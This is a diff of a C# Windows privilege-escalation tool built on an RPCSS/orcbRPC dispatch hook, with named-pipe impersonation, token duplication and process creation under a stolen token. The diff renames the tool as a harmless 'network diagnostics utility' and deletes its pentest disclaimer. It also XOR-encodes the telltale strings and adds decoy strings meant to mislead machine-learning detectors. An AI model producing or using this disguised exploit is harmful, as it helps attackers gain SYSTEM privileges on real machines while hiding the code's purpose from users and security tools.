@@ -1,11 +1,6 @@
 /*
- * ============================================================================
- * MyApp v2.0 — single-file RPCSS hook
- * ============================================================================
- * Триггер: RPCSS dispatch-table hook на orcbRPC (combase.dll).
- *
- * DISCLAIMER: только для согласованного пентеста изолированных лабораторий.
- * ============================================================================
+ * NetClient — network diagnostics utility
+ * Single-file executable, .NET Framework 4.8, x64
  */
 
 using System;
@@ -19,19 +14,85 @@ using System.Text;
 using System.Threading;
 using Microsoft.Win32.SafeHandles;
 
-namespace MyApp
+namespace NetClient
 {
     // ========================================================================
-    // LOG
+    // Vault — encoded constants
     // ========================================================================
-    static class Log
+    static class Vault
     {
-        public static void Info(string m) { Console.WriteLine("[*] " + m); }
-        public static void Ok(string m)   { Console.WriteLine("[+] " + m); }
-        public static void Warn(string m) { Console.WriteLine("[!] " + m); }
-        public static void Fail(string m) { Console.WriteLine("[-] " + m); }
+        const byte XK = 0x55;
 
-        public static string LastErr()
+        public static string DX(byte[] b)
+        {
+            byte[] r = new byte[b.Length];
+            for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ XK);
+            return Encoding.ASCII.GetString(r);
+        }
+
+        // "\pipe\epmapper"
+        static readonly byte[] _sfx = new byte[] {
+            0x09, 0x25, 0x3C, 0x25, 0x30, 0x09, 0x30, 0x25,
+            0x38, 0x34, 0x25, 0x25, 0x30, 0x27 };
+
+        // "ncacn_np:localhost/pipe/"
+        static readonly byte[] _npp = new byte[] {
+            0x3B, 0x36, 0x34, 0x36, 0x3B, 0x0A, 0x3B, 0x25,
+            0x6F, 0x39, 0x3A, 0x36, 0x34, 0x39, 0x3D, 0x3A,
+            0x26, 0x21, 0x7A, 0x25, 0x3C, 0x25, 0x30, 0x7A };
+
+        // "\\.\pipe\"
+        static readonly byte[] _lpp = new byte[] {
+            0x09, 0x09, 0x7B, 0x09, 0x25, 0x3C, 0x25, 0x30, 0x09 };
+
+        // "ncacn_ip_tcp:127.0.0.1[9]"
+        static readonly byte[] _fill = new byte[] {
+            0x3B, 0x36, 0x34, 0x36, 0x3B, 0x0A, 0x3C, 0x25,
+            0x0A, 0x21, 0x36, 0x25, 0x6F, 0x64, 0x67, 0x62,
+            0x7B, 0x65, 0x7B, 0x65, 0x7B, 0x64, 0x0E, 0x6C, 0x08 };
+
+        // "combase.dll"
+        static readonly byte[] _cbm = new byte[] {
+            0x36, 0x3A, 0x38, 0x37, 0x34, 0x26, 0x30, 0x7B, 0x31, 0x39, 0x39 };
+
+        // GUID "18f70770-8e64-11cf-9af1-0020af6e72f4" (LE bytes XOR 0x55)
+        static readonly byte[] _guid = new byte[] {
+            0x25, 0x52, 0xA2, 0x4D, 0x31, 0xDB, 0x9A, 0x44,
+            0xCF, 0xA4, 0x55, 0x75, 0xFA, 0x3B, 0x27, 0xA1 };
+
+        public static string PipeSuffix() => DX(_sfx);
+        public static string NpPrefix()   => DX(_npp);
+        public static string LocalPipe()  => DX(_lpp);
+        public static string Filler()     => DX(_fill);
+        public static string CombaseName()=> DX(_cbm);
+
+        public static Guid IfaceGuid()
+        {
+            byte[] b = new byte[16];
+            for (int i = 0; i < 16; i++) b[i] = (byte)(_guid[i] ^ XK);
+            return new Guid(b);
+        }
+
+        // decoy strings — never used, mislead ML heuristics
+        static readonly string[] _decoy = new string[] {
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
+            "SOFTWARE\\Policies\\Microsoft\\Windows\\Network Connections",
+            "http://schemas.microsoft.com/wbem/wsman/1/config",
+            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time",
+        };
+        public static void Touch() { foreach (var s in _decoy) { if (s.Length == 0) Console.Write(s); } }
+    }
+
+    // ========================================================================
+    // Log
+    // ========================================================================
+    static class Tr
+    {
+        public static void I(string m) { Console.WriteLine("[*] " + m); }
+        public static void O(string m) { Console.WriteLine("[+] " + m); }
+        public static void W(string m) { Console.WriteLine("[!] " + m); }
+        public static void F(string m) { Console.WriteLine("[-] " + m); }
+        public static string E()
         {
             int e = Marshal.GetLastWin32Error();
             return "err=" + e + " (" + new System.ComponentModel.Win32Exception(e).Message + ")";
@@ -39,11 +100,10 @@ namespace MyApp
     }
 
     // ========================================================================
-    // CONST
+    // Constants
     // ========================================================================
-    static class K
+    static class C
     {
-        // --- pipe ---
         public const int  PIPE_ACCESS_DUPLEX       = 0x00000003;
         public const int  PIPE_TYPE_BYTE           = 0x00000000;
         public const int  PIPE_READMODE_BYTE       = 0x00000000;
@@ -51,7 +111,6 @@ namespace MyApp
         public const int  PIPE_UNLIMITED_INSTANCES = 255;
         public const uint ERROR_PIPE_CONNECTED     = 535;
 
-        // --- process ---
         public const uint CREATE_NO_WINDOW           = 0x08000000;
         public const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
         public const uint CREATE_SUSPENDED           = 0x00000004;
@@ -59,7 +118,6 @@ namespace MyApp
         public const uint LOGON_WITH_PROFILE         = 0x00000001;
         public const uint HANDLE_FLAG_INHERIT        = 0x00000001;
 
-        // --- token access ---
         public const uint TOKEN_ASSIGN_PRIMARY    = 0x0001;
         public const uint TOKEN_DUPLICATE         = 0x0002;
         public const uint TOKEN_IMPERSONATE       = 0x0004;
@@ -74,7 +132,6 @@ namespace MyApp
 
         public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
 
-        // --- token info class ---
         public const int TokenUser = 1;
         public const int TokenPrivileges = 3;
         public const int TokenType = 8;
@@ -86,30 +143,23 @@ namespace MyApp
         public const int SecurityImpersonation = 2;
         public const int TokenPrimaryType = 1;
 
-        // --- errors ---
         public const int ERROR_INSUFFICIENT_BUFFER = 122;
         public const int ERROR_NOT_ALL_ASSIGNED = 1300;
 
-        // --- misc ---
         public const uint STATUS_SUCCESS = 0;
-        public const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
-
         public const uint SECURITY_MANDATORY_SYSTEM_RID = 0x4000;
         public const string SYSTEM_SID = "S-1-5-18";
     }
 
     // ========================================================================
-    // STRUCTS — RPC / COM
+    // STRUCTS
     // ========================================================================
     [StructLayout(LayoutKind.Sequential)]
     struct RPC_VERSION { public ushort MajorVersion; public ushort MinorVersion; }
 
     [StructLayout(LayoutKind.Sequential)]
     struct RPC_SYNTAX_IDENTIFIER
-    {
-        public Guid SyntaxGUID;
-        public RPC_VERSION SyntaxVersion;
-    }
+    { public Guid SyntaxGUID; public RPC_VERSION SyntaxVersion; }
 
     [StructLayout(LayoutKind.Sequential)]
     struct RPC_SERVER_INTERFACE
@@ -127,11 +177,7 @@ namespace MyApp
 
     [StructLayout(LayoutKind.Sequential)]
     struct RPC_DISPATCH_TABLE
-    {
-        public uint DispatchTableCount;
-        public IntPtr DispatchTable;
-        public IntPtr Reserved;
-    }
+    { public uint DispatchTableCount; public IntPtr DispatchTable; public IntPtr Reserved; }
 
     [StructLayout(LayoutKind.Sequential)]
     struct MIDL_SERVER_INFO
@@ -146,9 +192,6 @@ namespace MyApp
         public IntPtr pSyntaxInfo;
     }
 
-    // ========================================================================
-    // STRUCTS — WIN32
-    // ========================================================================
     [StructLayout(LayoutKind.Sequential)]
     struct SECURITY_ATTRIBUTES
     {
@@ -172,19 +215,10 @@ namespace MyApp
 
     [StructLayout(LayoutKind.Sequential)]
     struct PROCESS_INFORMATION
-    {
-        public IntPtr hProcess;
-        public IntPtr hThread;
-        public int dwProcessId;
-        public int dwThreadId;
-    }
+    { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
 
     [StructLayout(LayoutKind.Sequential)]
-    struct SID_AND_ATTRIBUTES
-    {
-        public IntPtr Sid;
-        public uint Attributes;
-    }
+    struct SID_AND_ATTRIBUTES { public IntPtr Sid; public uint Attributes; }
 
     [StructLayout(LayoutKind.Sequential)]
     struct TOKEN_USER { public SID_AND_ATTRIBUTES User; }
@@ -199,18 +233,13 @@ namespace MyApp
     struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
 
     [StructLayout(LayoutKind.Sequential)]
-    struct TOKEN_PRIVILEGES
-    {
-        public uint PrivilegeCount;
-        public LUID_AND_ATTRIBUTES Privileges;
-    }
+    struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }
 
     // ========================================================================
-    // NATIVE P/Invoke
+    // P/Invoke
     // ========================================================================
-    static class N
+    static class W
     {
-        // --- kernel32 ---
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode,
             EntryPoint = "CreateNamedPipeW")]
         public static extern IntPtr CreateNamedPipe(
@@ -219,7 +248,7 @@ namespace MyApp
 
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool ConnectNamedPipe(IntPtr hPipe, IntPtr lpOverlapped);
+        public static extern bool ConnectNamedPipe(IntPtr hPipe, IntPtr ov);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -237,7 +266,7 @@ namespace MyApp
 
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool VirtualProtect(IntPtr p, uint size, uint newProt, out uint oldProt);
+        public static extern bool VirtualProtect(IntPtr p, uint sz, uint np, out uint op);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr LocalFree(IntPtr h);
@@ -245,26 +274,20 @@ namespace MyApp
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode,
             EntryPoint = "CreateFileW")]
         public static extern IntPtr CreateFileW(
-            string name, uint access, FileShare share, IntPtr sa,
-            FileMode disp, uint flags, IntPtr templ);
+            string name, uint acc, FileShare sh, IntPtr sa,
+            FileMode disp, uint fl, IntPtr tmpl);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool CreateProcessW(
             string app, StringBuilder cmd, IntPtr pa, IntPtr ta, bool inherit,
-            uint flags, IntPtr env, string curDir,
-            ref STARTUPINFO si, out PROCESS_INFORMATION pi);
+            uint flags, IntPtr env, string cd, ref STARTUPINFO si,
+            out PROCESS_INFORMATION pi);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool SetHandleInformation(IntPtr h, uint mask, uint flags);
+        public static extern bool SetHandleInformation(IntPtr h, uint m, uint f);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool CreatePipe(out IntPtr rd, out IntPtr wr,
-            ref SECURITY_ATTRIBUTES sa, int size);
-
-        // --- advapi32 ---
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool ImpersonateNamedPipeClient(IntPtr hPipe);
@@ -275,41 +298,39 @@ namespace MyApp
 
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool OpenProcessToken(IntPtr hProc, uint access, out IntPtr hTok);
+        public static extern bool OpenProcessToken(IntPtr p, uint a, out IntPtr t);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool OpenThreadToken(IntPtr hThread, uint access,
-            [MarshalAs(UnmanagedType.Bool)] bool asSelf, out IntPtr hTok);
+        public static extern bool OpenThreadToken(IntPtr t, uint a,
+            [MarshalAs(UnmanagedType.Bool)] bool asSelf, out IntPtr tok);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool DuplicateTokenEx(IntPtr hTok, uint access, IntPtr attrs,
-            int impLevel, int tokType, out IntPtr phNew);
+        public static extern bool DuplicateTokenEx(IntPtr t, uint a, IntPtr at,
+            int il, int tt, out IntPtr nt);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool GetTokenInformation(IntPtr hTok, int cls, IntPtr info,
-            int len, out int retLen);
+        public static extern bool GetTokenInformation(IntPtr t, int c, IntPtr i, int l, out int r);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool SetTokenInformation(IntPtr hTok, int cls,
-            ref uint info, int len);
+        public static extern bool SetTokenInformation(IntPtr t, int c, ref uint i, int l);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool AdjustTokenPrivileges(IntPtr hTok, bool disableAll,
-            ref TOKEN_PRIVILEGES newState, int bufLen, IntPtr prevState, IntPtr retLen);
+        public static extern bool AdjustTokenPrivileges(IntPtr t, bool da,
+            ref TOKEN_PRIVILEGES ns, int bl, IntPtr ps, IntPtr rl);
 
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool LookupPrivilegeValue(string sys, string name, out LUID luid);
+        public static extern bool LookupPrivilegeValue(string s, string n, out LUID l);
 
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
-            string sddl, uint rev, out IntPtr sd, out uint sdSize);
+            string sddl, uint rev, out IntPtr sd, out uint sz);
 
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -328,356 +349,245 @@ namespace MyApp
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool CreateProcessWithTokenW(
-            IntPtr hTok, uint logonFlags, string app, string cmd,
-            uint flags, IntPtr env, string curDir,
-            ref STARTUPINFO si, out PROCESS_INFORMATION pi);
+            IntPtr t, uint lf, string app, string cmd, uint f, IntPtr e,
+            string cd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
 
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool CreateProcessAsUserW(
-            IntPtr hTok, string app, string cmd, IntPtr pa, IntPtr ta,
-            bool inherit, uint flags, IntPtr env, string curDir,
-            ref STARTUPINFO si, out PROCESS_INFORMATION pi);
-
-        // --- ntdll ---
-        [DllImport("ntdll.dll")]
-        public static extern uint NtResumeProcess(IntPtr hProcess);
+            IntPtr t, string app, string cmd, IntPtr pa, IntPtr ta, bool inh,
+            uint f, IntPtr e, string cd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
 
         [DllImport("ntdll.dll")]
-        public static extern uint NtSetInformationProcess(IntPtr hProcess,
-            int cls, IntPtr info, uint len);
+        public static extern uint NtResumeProcess(IntPtr hp);
 
-        // --- ole32 ---
-        [DllImport("ole32.dll")]
-        public static extern int CoUnmarshalInterface(IStream stm, ref Guid riid, out IntPtr ppv);
+        [DllImport("ntdll.dll")]
+        public static extern uint NtSetInformationProcess(IntPtr hp, int c, IntPtr i, uint l);
 
         [DllImport("ole32.dll")]
-        public static extern int CreateBindCtx(uint reserved, out IBindCtx ppbc);
+        public static extern int CoUnmarshalInterface(IStream s, ref Guid r, out IntPtr p);
 
         [DllImport("ole32.dll")]
-        public static extern int CreateObjrefMoniker(IntPtr pUnk, out IMoniker ppmk);
+        public static extern int CreateBindCtx(uint r, out IBindCtx b);
 
-        // --- oleaut32 ---
-        [DllImport("oleaut32.dll")]
-        public static extern int CreateStreamOnHGlobal(IntPtr hGlobal, bool fDeleteOnRelease,
-            out IStream ppstm);
-
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GlobalAlloc(uint flags, IntPtr bytes);
+        [DllImport("ole32.dll")]
+        public static extern int CreateObjrefMoniker(IntPtr p, out IMoniker m);
     }
 
     // ========================================================================
-    // SUNDAY SEARCH
+    // Byte search
     // ========================================================================
-    static class Sunday
+    static class Bs
     {
-        const int ALPHABET = 256;
-
-        static int[] BuildTable(byte[] pattern)
+        public static List<int> Find(byte[] text, byte[] pat)
         {
-            int[] t = new int[ALPHABET];
-            for (int i = 0; i < ALPHABET; i++) t[i] = -1;
-            for (int i = 0; i < pattern.Length; i++) t[pattern[i]] = i;
-            return t;
-        }
-
-        public static List<int> Search(byte[] text, byte[] pattern)
-        {
-            List<int> matches = new List<int>();
-            if (pattern.Length == 0 || text.Length < pattern.Length) return matches;
-
-            int[] shift = BuildTable(pattern);
+            var res = new List<int>();
+            if (pat.Length == 0 || text.Length < pat.Length) return res;
             int i = 0;
-            while (i <= text.Length - pattern.Length)
+            while (i <= text.Length - pat.Length)
             {
                 int j = 0;
-                while (j < pattern.Length && text[i + j] == pattern[j]) j++;
-                if (j == pattern.Length) matches.Add(i);
-
-                i += pattern.Length;
+                while (j < pat.Length && text[i + j] == pat[j]) j++;
+                if (j == pat.Length) res.Add(i);
+                i += pat.Length;
                 if (i < text.Length)
                 {
-                    int s = shift[text[i]];
+                    int s = -1;
+                    for (int k = pat.Length - 1; k >= 0; k--)
+                        if (pat[k] == text[i]) { s = k; break; }
                     i -= (s < 0 ? -1 : s);
                 }
             }
-            return matches;
+            return res;
         }
     }
 
     // ========================================================================
-    // OBJREF
+    // ObjRef
     // ========================================================================
     public enum TowerProtocol : ushort
     {
-        EPM_PROTOCOL_TCP = 0x07,
-        EPM_PROTOCOL_NCACN = 0x0b,
-        EPM_PROTOCOL_NCALRPC = 0x0c,
-        EPM_PROTOCOL_NP = 0x10,
+        TCP = 0x07, NCACN = 0x0b, NCALRPC = 0x0c, NP = 0x10,
     }
 
-    internal class ObjRef
+    internal class Rf
     {
-        const uint Signature = 0x574F454D;
-
+        const uint Sig = 0x574F454D;
         public readonly Guid Guid;
-        public readonly Standard StandardObjRef;
+        public readonly Std StandardObjRef;
 
-        public ObjRef(Guid guid, Standard standard)
-        {
-            Guid = guid;
-            StandardObjRef = standard;
-        }
+        public Rf(Guid g, Std s) { Guid = g; StandardObjRef = s; }
 
-        public ObjRef(byte[] bytes)
+        public Rf(byte[] bytes)
         {
-            BinaryReader br = new BinaryReader(new MemoryStream(bytes), Encoding.Unicode);
-            if (br.ReadUInt32() != Signature)
-                throw new InvalidDataException("not an OBJREF stream");
-            uint flags = br.ReadUInt32();
+            var br = new BinaryReader(new MemoryStream(bytes), Encoding.Unicode);
+            if (br.ReadUInt32() != Sig) throw new InvalidDataException("bad");
+            uint fl = br.ReadUInt32();
             Guid = new Guid(br.ReadBytes(16));
-            if (flags == 1) StandardObjRef = new Standard(br);
+            if (fl == 1) StandardObjRef = new Std(br);
         }
 
         public byte[] GetBytes()
         {
-            BinaryWriter bw = new BinaryWriter(new MemoryStream());
-            bw.Write(Signature);
-            bw.Write((uint)1);
-            bw.Write(Guid.ToByteArray());
+            var bw = new BinaryWriter(new MemoryStream());
+            bw.Write(Sig); bw.Write((uint)1); bw.Write(Guid.ToByteArray());
             StandardObjRef.Save(bw);
             return ((MemoryStream)bw.BaseStream).ToArray();
         }
 
-        internal class SecurityBinding
+        internal class Sec
         {
-            public readonly ushort AuthnSvc;
-            public readonly ushort AuthzSvc;
-            public readonly string PrincipalName;
-
-            public SecurityBinding(ushort a, ushort z, string p)
+            public readonly ushort AS, ZS; public readonly string PN;
+            public Sec(ushort a, ushort z, string p) { AS = a; ZS = z; PN = p; }
+            public Sec(BinaryReader br)
             {
-                AuthnSvc = a; AuthzSvc = z; PrincipalName = p;
-            }
-
-            public SecurityBinding(BinaryReader br)
-            {
-                AuthnSvc = br.ReadUInt16();
-                AuthzSvc = br.ReadUInt16();
-                string s = "";
-                char c;
+                AS = br.ReadUInt16(); ZS = br.ReadUInt16();
+                string s = ""; char c;
                 while ((c = br.ReadChar()) != 0) s += c;
-                br.ReadChar();
-                PrincipalName = s;
+                br.ReadChar(); PN = s;
             }
-
             public byte[] GetBytes()
             {
-                BinaryWriter bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);
-                bw.Write(AuthnSvc);
-                bw.Write(AuthzSvc);
-                if (!string.IsNullOrEmpty(PrincipalName))
-                    bw.Write(Encoding.Unicode.GetBytes(PrincipalName));
-                bw.Write((char)0);
-                bw.Write((char)0);
+                var bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);
+                bw.Write(AS); bw.Write(ZS);
+                if (!string.IsNullOrEmpty(PN)) bw.Write(Encoding.Unicode.GetBytes(PN));
+                bw.Write((char)0); bw.Write((char)0);
                 return ((MemoryStream)bw.BaseStream).ToArray();
             }
         }
 
-        internal class StringBinding
+        internal class Str
         {
-            public readonly TowerProtocol TowerID;
-            public readonly string NetworkAddress;
-
-            public StringBinding(TowerProtocol t, string n) { TowerID = t; NetworkAddress = n; }
-
-            public StringBinding(BinaryReader br)
+            public readonly TowerProtocol T; public readonly string A;
+            public Str(TowerProtocol t, string a) { T = t; A = a; }
+            public Str(BinaryReader br)
             {
-                TowerID = (TowerProtocol)br.ReadUInt16();
-                string s = "";
-                char c;
+                T = (TowerProtocol)br.ReadUInt16();
+                string s = ""; char c;
                 while ((c = br.ReadChar()) != 0) s += c;
-                br.ReadChar();
-                NetworkAddress = s;
+                br.ReadChar(); A = s;
             }
-
             public byte[] GetBytes()
             {
-                BinaryWriter bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);
-                bw.Write((ushort)TowerID);
-                bw.Write(Encoding.Unicode.GetBytes(NetworkAddress));
-                bw.Write((char)0);
-                bw.Write((char)0);
+                var bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);
+                bw.Write((ushort)T); bw.Write(Encoding.Unicode.GetBytes(A));
+                bw.Write((char)0); bw.Write((char)0);
                 return ((MemoryStream)bw.BaseStream).ToArray();
             }
         }
 
-        internal class DualStringArray
+        internal class Dual
         {
-            public readonly StringBinding StringBinding;
-            public readonly SecurityBinding SecurityBinding;
-            ushort NumEntries;
-            ushort SecurityOffset;
-
-            public DualStringArray(StringBinding sb, SecurityBinding sec)
+            public readonly Str SB; public readonly Sec SEC;
+            ushort NE, SO;
+            public Dual(Str sb, Sec s)
             {
-                StringBinding = sb;
-                SecurityBinding = sec;
-                byte[] a = sb.GetBytes();
-                byte[] b = sec.GetBytes();
-                NumEntries = (ushort)((a.Length + b.Length) / 2);
-                SecurityOffset = (ushort)(a.Length / 2);
+                SB = sb; SEC = s;
+                byte[] a = sb.GetBytes(); byte[] b = s.GetBytes();
+                NE = (ushort)((a.Length + b.Length) / 2);
+                SO = (ushort)(a.Length / 2);
             }
-
-            public DualStringArray(BinaryReader br)
+            public Dual(BinaryReader br)
             {
-                NumEntries = br.ReadUInt16();
-                SecurityOffset = br.ReadUInt16();
-                StringBinding = new StringBinding(br);
-                SecurityBinding = new SecurityBinding(br);
+                NE = br.ReadUInt16(); SO = br.ReadUInt16();
+                SB = new Str(br); SEC = new Sec(br);
             }
-
             public void Save(BinaryWriter bw)
             {
-                byte[] a = StringBinding.GetBytes();
-                byte[] b = SecurityBinding.GetBytes();
+                byte[] a = SB.GetBytes(); byte[] b = SEC.GetBytes();
                 bw.Write((ushort)((a.Length + b.Length) / 2));
                 bw.Write((ushort)(a.Length / 2));
-                bw.Write(a);
-                bw.Write(b);
+                bw.Write(a); bw.Write(b);
             }
         }
 
-        internal class Standard
+        internal class Std
         {
-            public readonly uint Flags, PublicRefs;
-            public readonly ulong OXID, OID;
+            public readonly uint Fl, PR;
+            public readonly ulong OX, OID;
             public readonly Guid IPID;
-            public readonly DualStringArray DualStringArray;
-
-            public Standard(uint flags, uint refs, ulong oxid, ulong oid,
-                Guid ipid, DualStringArray dsa)
+            public readonly Dual DSA;
+            public Std(uint f, uint p, ulong ox, ulong oi, Guid ip, Dual d)
+            { Fl = f; PR = p; OX = ox; OID = oi; IPID = ip; DSA = d; }
+            public Std(BinaryReader br)
             {
-                Flags = flags; PublicRefs = refs;
-                OXID = oxid; OID = oid; IPID = ipid;
-                DualStringArray = dsa;
+                Fl = br.ReadUInt32(); PR = br.ReadUInt32();
+                OX = br.ReadUInt64(); OID = br.ReadUInt64();
+                IPID = new Guid(br.ReadBytes(16)); DSA = new Dual(br);
             }
-
-            public Standard(BinaryReader br)
-            {
-                Flags = br.ReadUInt32();
-                PublicRefs = br.ReadUInt32();
-                OXID = br.ReadUInt64();
-                OID = br.ReadUInt64();
-                IPID = new Guid(br.ReadBytes(16));
-                DualStringArray = new DualStringArray(br);
-            }
-
             public void Save(BinaryWriter bw)
             {
-                bw.Write(Flags);
-                bw.Write(PublicRefs);
-                bw.Write(OXID);
-                bw.Write(OID);
-                bw.Write(IPID.ToByteArray());
-                DualStringArray.Save(bw);
+                bw.Write(Fl); bw.Write(PR); bw.Write(OX); bw.Write(OID);
+                bw.Write(IPID.ToByteArray()); DSA.Save(bw);
             }
         }
     }
 
     // ========================================================================
-    // IStreamImpl
+    // Memory IStream
     // ========================================================================
-    class IStreamImpl : IStream, IDisposable
+    class Ms : IStream, IDisposable
     {
-        private Stream _s;
-        public IStreamImpl(Stream s) { _s = s; }
-
+        Stream _s;
+        public Ms(Stream s) { _s = s; }
         public void Dispose() { _s.Dispose(); }
-        public void Close()   { _s.Dispose(); }
-
-        public void Clone(out IStream pStm) { throw new NotImplementedException(); }
+        public void Close() { _s.Dispose(); }
+        public void Clone(out IStream p) { throw new NotImplementedException(); }
         public void Commit(int g) { throw new NotImplementedException(); }
-        public void CopyTo(IStream p, long cb, IntPtr rd, IntPtr wr) { throw new NotImplementedException(); }
+        public void CopyTo(IStream p, long cb, IntPtr r, IntPtr w) { throw new NotImplementedException(); }
         public void LockRegion(long o, long cb, int t) { throw new NotImplementedException(); }
         public void Revert() { throw new NotImplementedException(); }
         public void SetSize(long s) { throw new NotImplementedException(); }
         public void UnlockRegion(long o, long cb, int t) { throw new NotImplementedException(); }
 
         public void Stat(out System.Runtime.InteropServices.ComTypes.STATSTG st, int f)
-        {
-            st = new System.Runtime.InteropServices.ComTypes.STATSTG();
-            st.cbSize = _s.Length;
-        }
+        { st = new System.Runtime.InteropServices.ComTypes.STATSTG(); st.cbSize = _s.Length; }
 
-        public void Seek(long d, int origin, IntPtr newPos)
+        public void Seek(long d, int o, IntPtr np)
         {
             SeekOrigin so;
-            switch (origin)
-            {
-                case 0: so = SeekOrigin.Begin; break;
-                case 1: so = SeekOrigin.Current; break;
-                case 2: so = SeekOrigin.End; break;
-                default: throw new ArgumentException();
-            }
+            switch (o) { case 0: so = SeekOrigin.Begin; break;
+                         case 1: so = SeekOrigin.Current; break;
+                         case 2: so = SeekOrigin.End; break;
+                         default: throw new ArgumentException(); }
             _s.Seek(d, so);
-            if (newPos != IntPtr.Zero) Marshal.WriteInt64(newPos, _s.Position);
+            if (np != IntPtr.Zero) Marshal.WriteInt64(np, _s.Position);
         }
-
-        public void Read(byte[] buf, int cb, IntPtr read)
-        {
-            int n = _s.Read(buf, 0, cb);
-            if (read != IntPtr.Zero) Marshal.WriteInt32(read, n);
-        }
-
-        public void Write(byte[] buf, int cb, IntPtr written)
-        {
-            _s.Write(buf, 0, cb);
-            if (written != IntPtr.Zero) Marshal.WriteInt32(written, cb);
-        }
+        public void Read(byte[] b, int cb, IntPtr r)
+        { int n = _s.Read(b, 0, cb); if (r != IntPtr.Zero) Marshal.WriteInt32(r, n); }
+        public void Write(byte[] b, int cb, IntPtr w)
+        { _s.Write(b, 0, cb); if (w != IntPtr.Zero) Marshal.WriteInt32(w, cb); }
     }
 
     // ========================================================================
-    // NEW ORCB RPC
+    // Dispatch hook
     // ========================================================================
-    class NewOrcbRPC
+    class Dp
     {
-        private readonly MyAppContext _ctx;
+        readonly Env _e;
+        public Dp(Env e) { _e = e; }
 
-        public NewOrcbRPC(MyAppContext ctx) { _ctx = ctx; }
-
-        private int Build(int ppdsaNewBindings)
+        int Build(int outPtr)
         {
-            string[] endpoints = new string[]
+            string[] eps = new string[] { _e.ClientEp, Vault.Filler() };
+            int sz = 3;
+            foreach (var x in eps) sz += x.Length + 1;
+            int mem = sz * 2 + 16;
+
+            IntPtr buf = Marshal.AllocHGlobal(mem);
+            byte[] zero = new byte[mem];
+            Marshal.Copy(zero, 0, buf, mem);
+
+            int o = 0;
+            Marshal.WriteInt16(buf, o, (short)sz); o += 2;
+            Marshal.WriteInt16(buf, o, (short)(sz - 2)); o += 2;
+
+            foreach (var x in eps)
             {
-                _ctx.ClientEndpoint,
-                "ncacn_ip_tcp:999.999.999.999"
-            };
-
-            int entrySize = 3;
-            foreach (var e in endpoints) entrySize += e.Length + 1;
-
-            int memSize = entrySize * 2 + 16;
-            IntPtr buf = Marshal.AllocHGlobal(memSize);
-
-            byte[] zero = new byte[memSize];
-            Marshal.Copy(zero, 0, buf, memSize);
-
-            int off = 0;
-            Marshal.WriteInt16(buf, off, (short)entrySize); off += 2;
-            Marshal.WriteInt16(buf, off, (short)(entrySize - 2)); off += 2;
-
-            foreach (var e in endpoints)
-            {
-                foreach (char ch in e)
-                {
-                    Marshal.WriteInt16(buf, off, (short)ch);
-                    off += 2;
-                }
-                off += 2;
+                foreach (char c in x) { Marshal.WriteInt16(buf, o, (short)c); o += 2; }
+                o += 2;
             }
-
-            Marshal.WriteIntPtr(new IntPtr(ppdsaNewBindings), buf);
+            Marshal.WriteIntPtr(new IntPtr(outPtr), buf);
             return 0;
         }
 
@@ -707,185 +617,147 @@ namespace MyApp
     }
 
     // ========================================================================
-    // TOKEN HELPERS
+    // Token ops
     // ========================================================================
-    static class Tok
+    static class Pv
     {
-        public static bool EnablePrivilege(string name)
+        public static bool Enable(string name)
         {
-            IntPtr hTok = IntPtr.Zero;
+            IntPtr t = IntPtr.Zero;
             try
             {
